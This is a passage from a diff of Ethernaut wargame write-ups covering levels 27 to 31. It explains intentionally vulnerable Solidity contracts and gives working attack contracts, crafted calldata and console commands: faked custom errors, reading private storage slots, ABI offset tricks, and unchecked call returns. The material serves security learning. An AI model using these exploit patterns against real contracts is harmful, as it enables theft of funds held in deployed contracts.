+    function setCoin(Coin coin_) external onlyOwner {
+        coin = coin_;
+    }
+}
+
+interface INotifyable {
+    function notify(uint256 amount) external;
+}
+```
+
+You call `requestDonation()`, it tries to give you 10 coins via `wallet.donate10()`. If the wallet doesn't have enough balance, it throws `NotEnoughBalance()` error, the catch block sees it and calls `wallet.transferRemainder()` to send you everything left.
+
+```c
+function transfer(address dest_, uint256 amount_) external {
+    uint256 currentBalance = balances[msg.sender];
+
+    if (amount_ <= currentBalance) {
+        balances[msg.sender] -= amount_;
+        balances[dest_] += amount_;
+
+        if (dest_.isContract()) {
+            INotifyable(dest_).notify(amount_);  // ← CALLS YOUR CONTRACT!
+        }
+    } else {
+        revert InsufficientBalance(currentBalance, amount_);
+    }
+}
+```
+
+When you receive coins, if you are a contract, `notify()` is called on you.
+
+Now look at `requestDonation()`:
+
+```c
+try wallet.donate10(msg.sender) {
+    return true;
+} catch (bytes memory err) {
+    if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+        wallet.transferRemainder(msg.sender); // drain trigger
+    }
+}
+```
+
+It catches errors from the **entire call chain** - not just `wallet.donate10()` directly. This includes errors thrown from inside `coin.transfer()` → `notify()`.
+
+So if you throw `NotEnoughBalance()` from your own `notify()` function, it bubbles all the way up. GoodSamaritan can't tell whether it came from the wallet or from your contract. They look identical - same error signature, same bytes.
+## Custom Errors
+
+```c
+// Old way - string errors
+revert("NotEnoughBalance");
+// encodes as: Error(string) ABI type
+
+// New way - custom errors (Solidity 0.8+)
+error NotEnoughBalance();
+revert NotEnoughBalance();
+// encodes as raw bytes of the error signature
+```
+
+The catch block checks:
+
+```c
+keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)
+```
+
+**It only checks the error SIGNATURE - not WHERE it came from.**
+
+So if YOU throw `NotEnoughBalance()` from your `notify()` function, it looks identical to the wallet throwing it. The GoodSamaritan can't tell the difference!
+
+1. You call requestDonation()
+2. wallet.donate10(you) runs
+3. coin.transfer(you, 10) runs
+4. your notify(10) is called
+5. you throw NotEnoughBalance()
+6. error bubbles up to the try/catch
+7. GoodSamaritan thinks wallet is empty
+8. calls wallet.transferRemainder(you)
+9. coin.transfer(you, 1_000_000) runs
+10. your notify(1_000_000) is called
+11. amount != 10, so you do nothing
+12. transfer completes - you have all coins
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0 <0.9.0;
+
+interface IGoodSamaritan {
+    function requestDonation() external returns (bool);
+}
+
+contract AttackGoodSamaritan {
+
+    error NotEnoughBalance();  // exact same name as wallet's error
+
+    IGoodSamaritan public target;
+
+    constructor(address _target) {
+        target = IGoodSamaritan(_target);
+    }
+
+    function attack() external {
+        target.requestDonation();
+    }
+
+    function notify(uint256 amount) external {
+        // when receiving 10 coins → fake the error, trigger remainder transfer
+        // when receiving all coins → do nothing, let it succeed
+        if (amount == 10) {
+            revert NotEnoughBalance();
+        }
+    }
+}
+```
+
+In Remix, deploy `AttackGoodSamaritan` with the GoodSamaritan instance address as constructor arg.
+
+Then in the Ethernaut console:
+
+```js
+// verify wallet is drained after attack
+const walletAddr = await contract.wallet()
+const coinAddr = await contract.coin()
+
+const coinABI = [{
+    "inputs":[{"name":"","type":"address"}],
+    "name":"balances",
+    "outputs":[{"name":"","type":"uint256"}],
+    "stateMutability":"view",
+    "type":"function"
+}]
+
+const coin = new web3.eth.Contract(coinABI, coinAddr)
+const bal = await coin.methods.balances(walletAddr).call()
+console.log(bal)  // should be 0 after attack
+```
+# 28 - Gatekeeper Three
+
+Cope with gates and become an entrant.
+##### Things that might help:
+
+- Recall return values of low-level functions.
+- Be attentive with semantic.
+- Refresh how storage works in Ethereum.
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SimpleTrick {
+    GatekeeperThree public target;
+    address public trick;
+    uint256 private password = block.timestamp;
+
+    constructor(address payable _target) {
+        target = GatekeeperThree(_target);
+    }
+
+    function checkPassword(uint256 _password) public returns (bool) {
+        if (_password == password) {
+            return true;
+        }
+        password = block.timestamp;
+        return false;
+    }
+
+    function trickInit() public {
+        trick = address(this);
+    }
+
+    function trickyTrick() public {
+        if (address(this) == msg.sender && address(this) != trick) {
+            target.getAllowance(password);
+        }
+    }
+}
+
+contract GatekeeperThree {
+    address public owner;
+    address public entrant;
+    bool public allowEntrance;
+
+    SimpleTrick public trick;
+
+    function construct0r() public {
+        owner = msg.sender;
+    }
+
+    modifier gateOne() {
+        require(msg.sender == owner);
+        require(tx.origin != owner);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(allowEntrance == true);
+        _;
+    }
+
+    modifier gateThree() {
+        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+            _;
+        }
+    }
+
+    function getAllowance(uint256 _password) public {
+        if (trick.checkPassword(_password)) {
+            allowEntrance = true;
+        }
+    }
+
+    function createTrick() public {
+        trick = new SimpleTrick(payable(address(this)));
+        trick.trickInit();
+    }
+
+    function enter() public gateOne gateTwo gateThree {
+        entrant = tx.origin;
+    }
+
+    receive() external payable {}
+}
+```
+
+The main contract. Has three gates protecting `enter()`. Holds ETH. Has an owner and an entrant. A helper contract created by GatekeeperThree. Holds a password (set to `block.timestamp` at deployment). Used to control `allowEntrance` via `getAllowance()`.
+## Gate One - Become the Owner Without Constructor
+
+```c
+modifier gateOne() {
+    require(msg.sender == owner);    // you must be owner
+    require(tx.origin != owner);     // but owner can't be an EOA calling directly
+    _;
+}
+```
+
+Two conditions here. You must be the owner, but `tx.origin` (the original human wallet) must NOT be the owner. This means the owner must be a contract, not your wallet directly.
+
+Now look at this:
+
+```c
+function construct0r() public {
+    owner = msg.sender;
+}
+```
+
+This looks like a constructor but it is NOT. Notice the zero - `construct0r` not `constructor`. In Solidity, only the function literally named `constructor` runs at deployment. This is just a regular public function anyone can call. So you call it from your attack contract and you become the owner.
+
+Since your attack contract calls it, `msg.sender = attack contract address = owner`. When you later call `enter()` through your attack contract, `msg.sender == owner` passes. And `tx.origin` is your wallet, not the attack contract, so `tx.origin != owner` also passes.
+## Gate Two - Get the Password from Storage
+
+```c
+modifier gateTwo() {
+    require(allowEntrance == true);
+    _;
+}
+```
+
+`allowEntrance` is set to true only through `getAllowance()`:
+
+```c
+function getAllowance(uint256 _password) public {
+    if (trick.checkPassword(_password)) {
+        allowEntrance = true;
+    }
+}
+```
+
+And `checkPassword` in SimpleTrick:
+
+```c
+uint256 private password = block.timestamp;  // set at deployment
+
+function checkPassword(uint256 _password) public returns (bool) {
+    if (_password == password) {
+        return true;
+    }
+    password = block.timestamp;  // resets if wrong!
+    return false;
+}
+```
+
+The password is `private` but private in Solidity only means other contracts can't read it via code. Anyone can still read raw storage slots directly.
+
+Storage layout of SimpleTrick:
+
+```
+slot 0 → target (address, 20 bytes)
+slot 1 → trick  (address, 20 bytes)
+slot 2 → password (uint256)
+```
+
+So you read slot 2 of the SimpleTrick contract to get the password. Important: you must call `createTrick()` first to deploy SimpleTrick, then read its storage before calling `getAllowance()` - because if you pass the wrong password, it resets to the current `block.timestamp`.
+
+Reading storage from console:
+
+```js
+const trickAddr = await contract.trick()
+const password = await web3.eth.getStorageAt(trickAddr, 2)
+await contract.getAllowance(password)
+```
+## Gate Three - Make ETH Send Fail
+
+```c
+modifier gateThree() {
+    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+        _;
+    }
+}
+```
+
+Two conditions both must be true for the gate to open:
+
+The GatekeeperThree contract must hold more than 0.001 ETH. And when it tries to send 0.001 ETH to the owner, that send must FAIL.
+
+Since your attack contract is the owner, you just make your attack contract reject ETH. No `receive()` or `fallback()` function means any ETH sent to it will revert. The `send()` call fails silently and returns false. Gate passes.
+
+You also need to send more than 0.001 ETH to GatekeeperThree before calling `enter()`.
+
+In Remix, deploy `AttackGatekeeperThree` with the instance address.
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperThree {
+    function construct0r() external;
+    function createTrick() external;
+    function getAllowance(uint256 _password) external;
+    function enter() external;
+    function trick() external view returns (address);
+}
+
+contract AttackGatekeeperThree {
+
+    IGatekeeperThree public target;
+
+    constructor(address payable _target) {
+        target = IGatekeeperThree(_target);
+    }
+
+    // Step 1: setup everything except entering
+    function setup() external {
+        target.construct0r();   // become owner
+        target.createTrick();   // deploy SimpleTrick
+    }
+
+    // Step 2: called after reading password off-chain
+    function unlock(uint256 _password) external {
+        target.getAllowance(_password);
+    }
+
+    // Step 3: fund the gate and enter
+    function attack() external payable {
+        require(msg.value > 0.001 ether, "Need more than 0.001 ETH");
+
+        // send ETH to GatekeeperThree
+        (bool ok,) = address(target).call{value: msg.value}("");
+        require(ok);
+
+        target.enter();
+    }
+
+    // deliberately no receive() - makes send() to this contract fail
+    // this is what makes gateThree pass
+}
+```
+
+```js
+const attackAddr = "0xA27B218621EE80B1Fb671a5C469C4CCA5EB54740"
+```
+
+```js
+const attackABI = [
+  {"inputs":[{"name":"_target","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
+  {"inputs":[],"name":"setup","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"name":"_password","type":"uint256"}],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"}
+]
+
+const attackContract = new web3.eth.Contract(attackABI, "0xA27B218621EE80B1Fb671a5C469C4CCA5EB54740")
+```
+
+```js
+// Calls construct0r() to make attack contract the owner
+// Then calls createTrick() to deploy SimpleTrick
+// Both happen inside setup() in one transaction
+await attackContract.methods.setup().send({from: player})
+```
+
+```js
+// Get SimpleTrick contract address that was just deployed
+const trickAddr = await contract.trick()
+
+// Read storage slot 2 of SimpleTrick
+// slot 0 = target address, slot 1 = trick address, slot 2 = password
+const password = await web3.eth.getStorageAt(trickAddr, 2)
+
+// Log it so we can see it
+console.log("Password is:", password)
+```
+
+```js
+// Pass the raw password bytes directly into getAllowance via our unlock function
+// This sets allowEntrance = true inside GatekeeperThree
+await attackContract.methods.unlock(password).send({from: player})
+
+// Verify it worked - should print true
+const allowed = await contract.allowEntrance()
+console.log("Gate 2 open:", allowed)
+```
+
+```js
+// Send 0.0011 ETH to GatekeeperThree and call enter() in one tx
+// Gate 3 needs balance > 0.001 ETH AND send() to owner must fail
+// send() fails because our attack contract has no receive() function
+await attackContract.methods.attack().send({
+    from: player,
+    value: web3.utils.toWei("0.0011", "ether")  // slightly more than 0.001
+})
+```
+
+```js
+// Check entrant is now set to your wallet address
+const entrant = await contract.entrant()
+console.log("Entrant:", entrant)
+console.log("You won:", entrant.toLowerCase() === player.toLowerCase())
+```
+# 29 - Switch
+
+Just have to flip the switch. Can't be that hard, right?
+##### Things that might help:
+
+Understanding how `CALLDATA` is encoded.
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Switch {
+    bool public switchOn; // switch is off
+    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
+
+    modifier onlyThis() {
+        require(msg.sender == address(this), "Only the contract can call this");
+        _;
+    }
+
+    modifier onlyOff() {
+        // we use a complex data type to put in memory
+        bytes32[1] memory selector;
+        // check that the calldata at position 68 (location of _data)
+        assembly {
+            calldatacopy(selector, 68, 4) // grab function selector from calldata
+        }
+        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
+        _;
+    }
+
+    function flipSwitch(bytes memory _data) public onlyOff {
+        (bool success,) = address(this).call(_data);
+        require(success, "call failed :(");
+    }
+
+    function turnSwitchOn() public onlyThis {
+        switchOn = true;
+    }
+
+    function turnSwitchOff() public onlyThis {
+        switchOn = false;
+    }
+}
+```
+
+We need to set `switchOn = true` by calling `turnSwitchOn()`. But every path to it is blocked by modifiers. You need to understand exactly how calldata is encoded to bypass the check.
+
+`flipSwitch(bytes memory _data)` is the only public entry point. It takes raw bytes and calls `address(this).call(_data)` - meaning whatever bytes you pass, it executes as a function call on the contract itself.
+
+`turnSwitchOn()` sets `switchOn = true` but has `onlyThis` modifier - only callable if `msg.sender == address(this)`. So you can only reach it through `flipSwitch`.
+
+`turnSwitchOff()` same story, only callable from the contract itself.
+
+```c
+modifier onlyOff() {
+    bytes32[1] memory selector;
+    assembly {
+        calldatacopy(selector, 68, 4)  // reads 4 bytes starting at position 68
+    }
+    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
+    _;
+}
+```
+
+This reads 4 bytes from calldata at **hardcoded position 68** and checks they equal the `turnSwitchOff()` selector. It assumes the function selector of `_data` will always be at byte 68. This assumption is the bug.
+## How Calldata is Normally Encoded
+
+When you call `flipSwitch(bytes memory _data)`, the calldata looks like this normally:
+
+```c
+Position  Content
+0x00      flipSwitch selector        (4 bytes)
+          keccak256("flipSwitch(bytes)")[0:4]
+
+0x04      offset pointer to _data    (32 bytes)
+          value = 0x20 = 32
+          meaning: _data starts 32 bytes from here
+
+0x24      length of _data            (32 bytes)
+          e.g. 0x04 = 4 bytes long
+
+0x44      actual _data content       (padded to 32 bytes)
+          e.g. turnSwitchOff selector
+```
+
+Position 68 decimal = 0x44. That's where `_data` content starts in a normal encoding. So normally if you pass `turnSwitchOff()` selector as `_data`, position 68 contains exactly that selector. The modifier reads position 68 and finds `turnSwitchOff` - check passes. Then `flipSwitch` executes `_data` which calls `turnSwitchOff`. Switch stays off. Useless.
+
+The modifier ASSUMES the offset pointer at 0x04 always points to 0x20, making data land at 0x44 (68). But ABI encoding only requires the offset to be a valid pointer - it doesn't require it to be 0x20.
+## Shift the Data
+
+You can manually craft calldata where the offset pointer points somewhere else, so the actual function call uses `turnSwitchOn()` selector, but position 68 still contains `turnSwitchOff()` selector to fool the modifier.
+
+Here is the crafted calldata layout:
+
+```c
+Position   Bytes     Meaning
+0x00       30c13ade  selector for flipSwitch(bytes)
+0x04       0000...60 offset = 0x60 = 96 (data starts 96 bytes from 0x04, NOT at 0x24)
+0x24       0000...00 empty/padding (32 bytes)
+0x44       20606e15  turnSwitchOff() selector  ← modifier reads HERE (pos 68)
+           000...00  padded to 32 bytes
+0x64       0000...04 length of actual _data = 4 bytes
+0x84       76227e12  turnSwitchOn() selector   ← this is what actually gets called
+           000...00  padded to 32 bytes
+```
+
+The modifier reads position 68 (0x44) and finds `turnSwitchOff` selector - check passes.
+
+But the offset pointer says data starts at position 0x04 + 0x60 = 0x64, where the length is 4 and content is `turnSwitchOn()` selector. So `address(this).call(_data)` actually calls `turnSwitchOn()`.
+
+First Deploy the contract in remix. Go to Remix, create `Switch.sol`, paste the original contract, compile and deploy on Sepolia. Copy the deployed address.
+## Computing the Selectors
+
+```js
+// turnSwitchOff selector
+const offSelector = web3.utils.keccak256("turnSwitchOff()").slice(0, 10)
+console.log("off:", offSelector)  // 0x20606e15
+
+// turnSwitchOn selector
+const onSelector = web3.utils.keccak256("turnSwitchOn()").slice(0, 10)
+console.log("on:", onSelector)   // 0x76227e12
+
+// flipSwitch selector
+const flipSelector = web3.utils.keccak256("flipSwitch(bytes)").slice(0, 10)
+console.log("flip:", flipSelector) // 0x30c13ade
+```
+## Building and Sending the Crafted Calldata
+
+```js
+// Build the malicious calldata manually piece by piece
+
+const calldata = (
+    // flipSwitch(bytes) selector - 4 bytes
+    "30c13ade" +
+
+    // offset pointer - normally 0x20 (32), we set to 0x60 (96)
+    // this makes the decoder look for _data at position 0x04 + 0x60 = 0x64
+    "0000000000000000000000000000000000000000000000000000000000000060" +
+
+    // dead zone - 32 bytes of padding at position 0x24
+    // modifier reads position 68 (0x44) from here - we put turnSwitchOff here
+    "0000000000000000000000000000000000000000000000000000000000000000" +
+
+    // position 0x44 (68) - turnSwitchOff selector - fools the modifier
+    "20606e1500000000000000000000000000000000000000000000000000000000" +
+
+    // position 0x64 - length of _data = 4 bytes
+    "0000000000000000000000000000000000000000000000000000000000000004" +
+
+    // position 0x84 - actual _data = turnSwitchOn selector
+    "76227e1200000000000000000000000000000000000000000000000000000000"
+)
+
+// Send raw transaction with our crafted calldata
+await web3.eth.sendTransaction({
+    from: player,
+    to: instance,           // the Switch contract address
+    data: "0x" + calldata
+})
+
+// Verify the switch is now on
+const result = await contract.switchOn()
+console.log("Switch is on:", result)  // should be true
+```
+
+```js
+// Paste your Remix deployed Switch address here
+const switchAddr = "PASTE_YOUR_REMIX_DEPLOYED_ADDRESS"
+
+// Build the crafted calldata
+const calldata = (
+    "30c13ade" +
+    "0000000000000000000000000000000000000000000000000000000000000060" +
+    "0000000000000000000000000000000000000000000000000000000000000000" +
+    "20606e1500000000000000000000000000000000000000000000000000000000" +
+    "0000000000000000000000000000000000000000000000000000000000000004" +
+    "76227e1200000000000000000000000000000000000000000000000000000000"
+)
+
+// Send with explicit gas limit - not too high, not too low
+await web3.eth.sendTransaction({
+    from: player,
+    to: switchAddr,
+    data: "0x" + calldata,
+    gas: 100000   // explicit reasonable gas limit
+})
+```
+
+When the EVM receives your calldata and hits the `onlyOff` modifier, it runs `calldatacopy(selector, 68, 4)` which blindly reads 4 bytes at position 68. You put `turnSwitchOff` selector there so the check passes.
+
+Then `flipSwitch` runs and does `address(this).call(_data)`. To decode `_data`, the EVM reads the offset pointer at position 4, sees 0x60, jumps to position 0x04 + 0x60 = 0x64, reads the length (4), reads 4 bytes of content (`turnSwitchOn` selector), and executes that call.
+
+`turnSwitchOn()` runs, `onlyThis` passes because caller is the contract itself, `switchOn = true`.
+
+**ABI encoding of dynamic types** - `bytes` is a dynamic type. It is encoded as an offset pointer followed by length followed by data. The offset is relative and can point anywhere valid in the calldata. Nothing enforces it must be 0x20.
+
+**Hardcoded offset assumption** - The modifier assumes `_data` content always starts at byte 68. This is only true for standard encoding. Manually crafted calldata can place anything at position 68 while the actual data lives elsewhere.
+
+**calldatacopy reads raw bytes** - It doesn't understand ABI encoding. It just copies bytes from a position. Completely blind to where the real data actually is.
+
+**Low level call with raw bytes** - `address(this).call(_data)` uses ABI decoding properly, following the offset pointer to find the real data. So the modifier and the actual call decode the same calldata in completely different ways - that gap is the exploit.
+# 30 - Higher Order
+
+Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.
+
+Your objective is to become the Commander of the Higher Order! Good luck!
+##### Things that might help:
+
+- Sometimes, `calldata` cannot be trusted.
+- Compilers are constantly evolving into better spaceships.
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity 0.6.12;
+
+contract HigherOrder {
+    address public commander;
+
+    uint256 public treasury;
+
+    function registerTreasury(uint8) public {
+        assembly {
+            sstore(treasury_slot, calldataload(4))
+        }
+    }
+
+    function claimLeadership() public {
+        if (treasury > 255) commander = msg.sender;
+        else revert("Only members of the Higher Order can become Commander");
+    }
+}
+```
+
+Become the `commander` by calling `claimLeadership()`. That requires `treasury > 255`. But `registerTreasury` takes a `uint8` which can only hold 0-255. Classic trap.
+
+```c
+function registerTreasury(uint8) public {
+    assembly {
+        sstore(treasury_slot, calldataload(4))
+    }
+}
+```
+
+The function signature says `uint8` - meaning Solidity's ABI encoder would normally reject any value above 255. But look inside - it completely ignores the Solidity parameter. It uses raw assembly to read calldata directly at byte position 4 and store it into the treasury slot.
+
+`calldataload(4)` reads a full **32 byte word** starting at position 4. It doesn't care what the function signature says. It doesn't care about uint8 limits. It reads raw bytes.
+
+So if you craft calldata manually with a value greater than 255 at position 4, the assembly will store that full value into treasury - completely bypassing the uint8 type restriction.
+
+```c
+function claimLeadership() public {
+    if (treasury > 255) commander = msg.sender;
+    else revert("Only members of the Higher Order can become Commander");
+}
+```
+
+Simple. If treasury is above 255, you become commander. No other checks.
+
+
+Solidity says the parameter is `uint8` - but that restriction only exists at the ABI encoding level. The EVM itself has no concept of uint8 in calldata. Calldata is just raw bytes. The assembly reads those raw bytes directly, skipping every Solidity type check entirely.
+
+This is a Solidity 0.6.x issue too. Newer versions added stricter calldata validation, but 0.6.12 does not validate that the calldata actually matches the declared parameter types before the function body runs.
+
+```
+Normal path:   you → ABI encode uint8(200) → calldata → Solidity checks type → assembly reads 200
+               treasury = 200, stays under 255, can never claim leadership
+
+Exploit path:  you → manually craft calldata → skip ABI encoding → assembly reads 256+
+               treasury = 256, greater than 255, claim leadership!
+```
+
+## Calldata Layout
+
+When calling `registerTreasury(uint8)` the calldata is:
+
+```c
+Position 0-3:   function selector   keccak256("registerTreasury(uint8)")[0:4]
+Position 4-35:  the argument        32 bytes, ABI encoded
+```
+
+Normally ABI encoding of uint8(200) pads to 32 bytes:
+
+```c
+0x0000000000000000000000000000000000000000000000000000000000000000c8
+```
+
+But you can put ANY 32 byte value at position 4. The assembly reads all 32 bytes raw. So put 256 there:
+
+```c
+0x0000000000000000000000000000000000000000000000000000000000000100
+```
+
+That is 256 in hex. Treasury becomes 256. Greater than 255. Done.
+
+Compute the selector:
+
+```js
+const selector = web3.utils.keccak256("registerTreasury(uint8)").slice(0, 10)
+undefined
+selector
+"0x211c85ab"
+```
+
+```js
+// Step 1 - build calldata manually
+// selector for registerTreasury(uint8) = 211c85ab
+// value 256 in 32 bytes = 0x0000...0100
+const calldata = (
+    "211c85ab" +   // function selector
+    // 256 as a 32 byte hex value
+    // 256 in hex = 0x100, padded to 32 bytes
+    "0000000000000000000000000000000000000000000000000000000000000100"
+)
+
+// Step 2 - send raw transaction bypassing ABI encoding
+await web3.eth.sendTransaction({
+    from: player,
+    to: instance,
+    data: "0x" + calldata,
+    gas: 100000
+})
+
+// Step 3 - verify treasury is now 256
+const treasury = await contract.treasury()
+treasury.toString()  // should be "256"
+
+// Step 4 - claim leadership
+await contract.claimLeadership()
+
+// Step 5 - verify you are commander
+const commander = await contract.commander()
+commander  // should be your player address
+commander.toLowerCase() === player.toLowerCase()  // true
+```
+
+`calldataload(4)` is a raw EVM opcode. It has no knowledge of Solidity types. It just reads 32 bytes from position 4 of whatever calldata was sent. The uint8 declaration in the function signature is purely a Solidity compiler concept - it affects how the compiler generates ABI encoding for calls made within Solidity code. But when you send a raw transaction directly, you bypass the compiler entirely and talk straight to the EVM.
+
+The assembly inside `registerTreasury` then takes those raw 32 bytes and stores them directly into the treasury storage slot with `sstore`. No casting, no bounds checking, no uint8 truncation. Full 256 bit value goes straight into storage.
+
+**ABI encoding vs raw calldata** - Solidity's type system enforces limits during encoding but the EVM itself is typeless. Raw transactions skip encoding entirely.
+
+**calldataload** - EVM opcode that reads exactly 32 bytes from a calldata offset. Completely blind to Solidity types.
+
+**Assembly bypasses type safety** - The moment you use inline assembly to read calldata directly, you lose all Solidity type guarantees. The uint8 parameter declaration becomes meaningless.
+
+**Solidity 0.6.x loose calldata validation** - Older Solidity versions do not revert if calldata contains values that overflow the declared parameter type. Newer versions added stricter checks. This is why the pragma is pinned to 0.6.12 - the exploit does not work on 0.8.x.
+# 31 - Stake
+
+Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1 value of the tokens. Can you drain the contract?
+
+To complete this level, the contract state must meet the following conditions:
+
+- The `Stake` contract's ETH balance has to be greater than 0.
+- `totalStaked` must be greater than the `Stake` contract's ETH balance.
+- You must be a staker.
+- Your staked balance must be 0.
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract Stake {
+
+    uint256 public totalStaked;
+    mapping(address => uint256) public UserStake;
+    mapping(address => bool) public Stakers;
+    address public WETH;
+
+    constructor(address _weth) payable{
+        totalStaked += msg.value;
+        WETH = _weth;
+    }
+
+    function StakeETH() public payable {
+        require(msg.value > 0.001 ether, "Don't be cheap");
+        totalStaked += msg.value;
+        UserStake[msg.sender] += msg.value;
+        Stakers[msg.sender] = true;
+    }
+    function StakeWETH(uint256 amount) public returns (bool){
+        require(amount >  0.001 ether, "Don't be cheap");
+        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
+        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
+        totalStaked += amount;
+        UserStake[msg.sender] += amount;
+        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
+        Stakers[msg.sender] = true;
+        return transfered;
+    }
+
+    function Unstake(uint256 amount) public returns (bool){
+        require(UserStake[msg.sender] >= amount,"Don't be greedy");
+        UserStake[msg.sender] -= amount;
+        totalStaked -= amount;
+        (bool success, ) = payable(msg.sender).call{value : amount}("");
+        return success;
+    }
+    function bytesToUint(bytes memory data) internal pure returns (uint256) {
+        require(data.length >= 32, "Data length must be at least 32 bytes");
+        uint256 result;
+        assembly {
+            result := mload(add(data, 0x20))
+        }
+        return result;
+    }
+}
+```
+
+Meet all four conditions simultaneously:
+
+1. Stake contract ETH balance > 0
+2. totalStaked > Stake contract ETH balance
+3. You must be a Staker
+4. Your staked balance must be 0
+## Understanding Every Function
+### StakeETH
+
+```c
+function StakeETH() public payable {
+    require(msg.value > 0.001 ether, "Don't be cheap");
+    totalStaked += msg.value;
+    UserStake[msg.sender] += msg.value;
+    Stakers[msg.sender] = true;
+}
+```
+
+Straightforward. Send ETH, it tracks your balance, marks you as staker.
+## StakeWETH
+
+```c
+function StakeWETH(uint256 amount) public returns (bool) {
+    require(amount > 0.001 ether, "Don't be cheap");
+
+    // checks your WETH allowance
+    (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this)));
+    require(bytesToUint(allowance) >= amount, "How am I moving the funds honey?");
+
+    totalStaked += amount;
+    UserStake[msg.sender] += amount;
+
+    // tries to transferFrom your WETH
+    (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender, address(this), amount));
+
+    Stakers[msg.sender] = true;
+    return transfered;  // ← BUG: return value never checked!
+}
+```
+### Unstake
+
+```c
+function Unstake(uint256 amount) public returns (bool) {
+    require(UserStake[msg.sender] >= amount, "Don't be greedy");
+    UserStake[msg.sender] -= amount;
+    totalStaked -= amount;
+    (bool success, ) = payable(msg.sender).call{value: amount}("");
+    return success;  // ← BUG: return value never checked!
+}
+```
+## Bug 1 - StakeWETH never checks if transferFrom succeeded
+
+```c
+(bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender, address(this), amount));
+Stakers[msg.sender] = true;
+return transfered;  // returned but never required!
+```
+
+The `transfered` bool is returned to the caller but there is no `require(transfered)`. So even if the WETH transfer completely fails, the function still updates `totalStaked` and `UserStake[msg.sender]`. You get credit for staking WETH you never actually sent.
+## Bug 2 - Unstake never checks if ETH transfer succeeded
+
+```c
+(bool success, ) = payable(msg.sender).call{value: amount}("");
+return success;  // returned but never required!
+```
+
+If the ETH transfer fails, your `UserStake` is already decremented and `totalStaked` is already decremented - but you never got the ETH. The contract still holds the ETH but thinks it was sent out.
+
+You need to exploit both bugs together to meet all four conditions.
+
+The trick is using a contract that **rejects ETH** as your attack contract. When Unstake tries to send ETH to a contract with no receive function, the transfer fails silently. Your balance goes to 0 but the ETH stays in the contract.
+
+```
+1. StakeETH with 0.001+ ETH from attack contract
+   → contract gets real ETH
+   → your UserStake increases
+   → you become a Staker
+
+2. StakeWETH with some amount (approve a tiny amount or zero)
+   → transferFrom fails silently
+   → but totalStaked and UserStake still increase!
+   → totalStaked is now inflated beyond real ETH balance
+
+3. Unstake your full balance
+   → UserStake goes to 0
+   → ETH transfer to your contract FAILS (no receive function)
+   → ETH stays in contract
+   → totalStaked decremented but ETH never left
+
+Result:
+   Contract ETH balance > 0          (your staked ETH still there)
+   totalStaked > ETH balance          (inflated by fake WETH stake)
+   You are a Staker                   (set in StakeETH, never unset)
+   Your UserStake = 0                (decremented in Unstake)
+```
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract AttackStake {
+
+    address public target;
+    address public weth;
+
+    constructor(address _target, address _weth) {
+        target = _target;
+        weth = _weth;
+    }
+
+    function attack() external payable {
+        // Step 1: Stake real ETH - become a staker
+        (bool s1,) = target.call{value: msg.value}(
+            abi.encodeWithSignature("StakeETH()")
+        );
+        require(s1, "StakeETH failed");
+
+        // Step 2: Approve WETH for target (we have no WETH, transfer will fail silently)
+        (bool s2,) = weth.call(
+            abi.encodeWithSignature("approve(address,uint256)", target, type(uint256).max)
+        );
+        require(s2, "approve failed");
+
+        // Step 3: StakeWETH - transferFrom fails but totalStaked still inflates
+        target.call(
+            abi.encodeWithSignature("StakeWETH(uint256)", msg.value)
+        );
+        // intentionally not checking return - mirrors the contract's own bug
+
+        // Step 4: Read our current stake balance
+        (,bytes memory data) = target.call(
+            abi.encodeWithSignature("UserStake(address)", address(this))
+        );
+        uint256 myStake = abi.decode(data, (uint256));
+
+        // Step 5: Unstake everything
+        // ETH transfer back to us will FAIL because we have no receive()
+        // But UserStake becomes 0 and ETH stays in contract
+        target.call(
+            abi.encodeWithSignature("Unstake(uint256)", myStake)
+        );
+        // intentionally not checking - ETH transfer will fail, that's the point
+    }
+
+    // NO receive() on purpose - makes Unstake's ETH send fail silently
+}
+```
+
+Run this in console before deploying:
+
+```js
+// Get the WETH address you need for constructor
+const wethAddr = await contract.WETH()
+wethAddr  // copy this
+"0xCd8AF4A0F29cF7966C051542905F66F5dca9052f"
+```
+
+Constructor args:
+
+- `_target` → your instance address
+- `_weth` → wethAddr from above
+
+```js
+// Step 1 - save your attack contract address
+const attackAddr = "PASTE_YOUR_DEPLOYED_ATTACK_CONTRACT"
+
+// Step 2 - build ABI for attack function only
+const attackABI = [{
+    "inputs": [],
+    "name": "attack",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+}]
+
+// Step 3 - create web3 contract instance
+const attackContract = new web3.eth.Contract(attackABI, attackAddr)
+
+// Step 4 - run attack with 0.0011 ETH (must be > 0.001)
+await attackContract.methods.attack().send({
+    from: player,
